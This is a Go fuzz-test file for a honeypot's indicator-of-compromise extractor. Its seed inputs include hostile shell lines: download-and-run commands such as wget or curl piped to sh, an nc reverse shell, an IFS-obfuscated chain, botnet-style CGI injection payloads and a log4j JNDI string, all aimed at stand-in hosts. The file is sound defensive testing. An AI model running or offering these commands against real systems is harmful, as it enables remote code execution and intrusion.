package intelligence

import (
	"net"
	"regexp"
	"strings"
	"testing"
	"time"
	"unicode"

	"github.com/qpot/qpot/internal/database"
)

var hexOnly = regexp.MustCompile(`^[0-9a-f]+$`)

// FuzzExtract throws arbitrary attacker-controlled command / username /
// password / source-IP strings at the IOC extractor and asserts a set of
// invariants that must hold for every IOC it emits. The extractor parses
// untrusted input, so it must never panic and must never emit malformed IOCs.
func FuzzExtract(f *testing.F) {
	seeds := []string{
		"wget http://evil.com/x.sh; chmod +x x.sh",
		"curl ftp://bad.org/payload | sh",
		"echo d41d8cd98f00b204e9800998ecf8427e",
		"nc 203.0.113.5 4444 -e /bin/sh",
		"http://a.b.c.d.example.co.uk/path?q=1&z=2)",
		"https://xn--80ak6aa92e.com/",
		"",
		strings.Repeat("A", 5000),
		"http://" + strings.Repeat("a.", 200) + "com/x",
		"\x00\x01\xff http://\xff\xfe.com",
		"send btc to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
		"eth 0x52908400098527886E0F7030069857D2E4169EE7 pool",
		"3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy 1zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz",
		"hxxp://evil[.]com/x.sh hxxps://c2[dot]bad[dot]org",
		"connect 1[.]2[.]3[.]4 [at] [dot] [://] [:]",
		"hxxxxxxp://[.][.][.] dot dot dot",
		"cd /tmp;wget http://198.51.100.7/a;chmod +x a&&./a|sh",
		"wget${IFS}http://198.51.100.7/b${IFS}-O-;curl http://;id",
		"wget http://198.51.100.7/0123456789abcdef0123456789abcdef/x echo fedcba9876543210fedcba9876543210",
		"curl -s http://ipinfo.io/ip; curl http://ipinfo.io.evil.example/",
	}
	for _, s := range seeds {
		f.Add(s)
	}

	e := NewExtractor()

	f.Fuzz(func(t *testing.T, cmd string) {
		ev := &database.Event{
			Honeypot:  "cowrie",
			EventType: "command",
			Command:   cmd,
			SourceIP:  "203.0.113.7",
			Username:  "root",
			Password:  cmd, // exercise credential path with arbitrary bytes too
			Timestamp: time.Now().UTC(),
		}

		iocs := e.Extract(ev) // must not panic

		for _, ioc := range iocs {
			if ioc == nil {
				t.Fatal("nil IOC emitted")
			}
			switch ioc.Type {
			case IOCTypeIP:
				if ip := net.ParseIP(ioc.Value); ip == nil {
					t.Errorf("IP IOC has unparseable value %q", ioc.Value)
				}
				if isPrivateIP(ioc.Value) {
					t.Errorf("IP IOC %q is private/loopback and should have been filtered", ioc.Value)
				}
			case IOCTypeHash:
				n := len(ioc.Value)
				// MD5 / SHA-1 / SHA-256 / SHA-512.
				if n != 32 && n != 40 && n != 64 && n != 128 {
					t.Errorf("hash IOC %q has invalid length %d", ioc.Value, n)
				}
				if !hexOnly.MatchString(ioc.Value) {
					t.Errorf("hash IOC %q is not lowercase hex", ioc.Value)
				}
			case IOCTypeURL:
				// A URL must not contain internal whitespace; the extractor's
				// regex relies on this and downstream consumers do too.
				if strings.IndexFunc(ioc.Value, unicode.IsSpace) >= 0 {
					t.Errorf("URL IOC %q contains whitespace", ioc.Value)
				}
				// A URL IOC must not retain over-captured trailing shell
				// punctuation, which would defeat de-duplication.
				if strings.ContainsAny(ioc.Value[len(ioc.Value)-1:], urlTrailingCutset) {
					t.Errorf("URL IOC %q ends with trailing shell punctuation", ioc.Value)
				}
				// Nor run on past a shell separator, nor lack a host.
				for _, stop := range urlShellStops {
					if strings.Contains(ioc.Value, stop) {
						t.Errorf("URL IOC %q runs past shell separator %q", ioc.Value, stop)
					}
				}
				if urlHost(ioc.Value) == "" {
					t.Errorf("URL IOC %q has no host", ioc.Value)
				}
			case IOCTypeDomain:
				// A domain IOC must not carry a scheme or a path separator.
				if strings.Contains(ioc.Value, "/") || strings.Contains(ioc.Value, ":") {
					t.Errorf("domain IOC %q looks like a URL, not a bare domain", ioc.Value)
				}
				if ioc.Value != strings.ToLower(ioc.Value) {
					t.Errorf("domain IOC %q is not lowercased", ioc.Value)
				}
			case IOCTypeWallet:
				// Either an ETH address (0x + 40 lowercase hex) or a BTC
				// address whose base58check checksum actually verifies - the
				// extractor must never emit an unvalidated BTC candidate.
				if strings.HasPrefix(ioc.Value, "0x") {
					if len(ioc.Value) != 42 || !hexOnly.MatchString(ioc.Value[2:]) {
						t.Errorf("ETH wallet IOC %q is malformed", ioc.Value)
					}
				} else if !validateBTCAddress(ioc.Value) {
					t.Errorf("BTC wallet IOC %q fails base58check validation", ioc.Value)
				}
			}
			// Every IOC must carry a stable, non-empty ID and value.
			if ioc.Value == "" {
				t.Errorf("IOC of type %q has empty value", ioc.Type)
			}
			if ioc.ID == "" {
				t.Errorf("IOC of type %q has empty ID", ioc.Type)
			}
		}
	})
}

// FuzzURLHost feeds arbitrary URL authorities to the host parser. The host is
// what an IOC (and an IDS rule built from it) will name, so it must never be
// the userinfo, a port, a private or loopback address in any spelling, or a
// non-canonical number that is really an IPv4 address.
func FuzzURLHost(f *testing.F) {
	for _, s := range []string{
		"evil.example/x", "cdn.example.com@203.0.113.9/x.sh", "u:p@dl.evil.example:8080/b",
		"[2001:db8::9]:80/", "[::ffff:10.0.0.1]/", "127.1/", "0x7f.0.0.1", "0177.0.0.1",
		"2130706433", "0xcb.0.0x71.9", "203.0.28937", "1.2.3.4.5", "999.1.1.1", "a.b.c.123",
		"evil.example.", "@", "[", "a@b@c.example", "x.example\\y@z", "0x", "0x.0x.0x.0x",
		"08.1.1.1", "4294967296", "1..2", "%65vil.example",
	} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, rest string) {
		u := "http://" + rest
		host := urlHost(u)
		if strings.ContainsAny(host, "@/?#\\") {
			t.Fatalf("urlHost(%q) = %q keeps authority punctuation", u, host)
		}
		typ, v := hostIOC(host)
		switch typ {
		case "":
			if v != "" {
				t.Fatalf("hostIOC(%q) = (%q, %q)", host, typ, v)
			}
		case IOCTypeIP:
			if net.ParseIP(v) == nil || isPrivateIP(v) {
				t.Fatalf("hostIOC(%q) gave IP IOC %q", host, v)
			}
		case IOCTypeDomain:
			if !reHostname.MatchString(v) {
				t.Fatalf("hostIOC(%q) gave domain %q", host, v)
			}
			if _, numeric := looseIPv4(v); numeric {
				t.Fatalf("hostIOC(%q) gave numeric host %q as a domain", host, v)
			}
		default:
			t.Fatalf("hostIOC(%q) gave type %q", host, typ)
		}
		// A plain dotted quad reads the same both ways.
		if ip := net.ParseIP(host); ip != nil && ip.To4() != nil && !strings.Contains(host, ":") {
			if v4, numeric := looseIPv4(host); !numeric || v4 != ip.To4().String() {
				t.Fatalf("looseIPv4(%q) = %q, %v; net.ParseIP says %s", host, v4, numeric, ip)
			}
		}
	})
}

// FuzzExtractPayload feeds arbitrary web request targets and request lines
// (as tanner, go-pot or log4pot store them) to the extractor. Decoding the
// target must never panic, never yield a URL without a host or one that runs
// past a shell separator, and stay linear on hostile input.
func FuzzExtractPayload(f *testing.F) {
	for _, s := range []string{
		"/setup.cgi?todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://198.51.100.7/Mozi.m+-O+/tmp/n;sh+n",
		"/shell?cd%20/tmp;wget%20http://198.51.100.7/jaws;sh%20/tmp/jaws",
		"/index.php?u=http%3A%2F%2F198.51.100.7%2Fa.sh&x=%",
		"GET /?x=${jndi:ldap://198.51.100.7/a} HTTP/1.1",
		"GET /cgi-bin/x?c=wget%20http://198.51.100.7/c.sh HTTP/1.1\r\nHost: a",
		"http://198.51.100.7/a+b.sh", "/%", "/%2", "/%zz?+%%", "/?" + strings.Repeat("%2", 3000),
		"/" + strings.Repeat("http://a.example/;", 400), "GET " + strings.Repeat("/", 5000),
	} {
		f.Add(s)
	}
	e := NewExtractor()
	f.Fuzz(func(t *testing.T, payload string) {
		ev := &database.Event{Honeypot: "tanner", EventType: "tanner.http.get", Protocol: "http",
			SourceIP: "203.0.113.7", Payload: []byte(payload), Timestamp: time.Now().UTC()}
		start := time.Now()
		iocs := e.Extract(ev)
		if d := time.Since(start); d > time.Second {
			t.Fatalf("Extract took %v on a %d-byte payload", d, len(payload))
		}
		for _, ioc := range iocs {
			switch ioc.Type {
			case IOCTypeURL:
				if urlHost(ioc.Value) == "" || strings.IndexFunc(ioc.Value, unicode.IsSpace) >= 0 {
					t.Errorf("URL IOC %q", ioc.Value)
				}
				for _, stop := range urlShellStops {
					if strings.Contains(ioc.Value, stop) {
						t.Errorf("URL IOC %q runs past %q", ioc.Value, stop)
					}
				}
			case IOCTypeIP:
				if net.ParseIP(ioc.Value) == nil || isPrivateIP(ioc.Value) {
					t.Errorf("IP IOC %q", ioc.Value)
				}
			case IOCTypeDomain:
				if !reHostname.MatchString(ioc.Value) || isIPEchoHost(ioc.Value) {
					t.Errorf("domain IOC %q", ioc.Value)
				}
			}
		}
	})
}
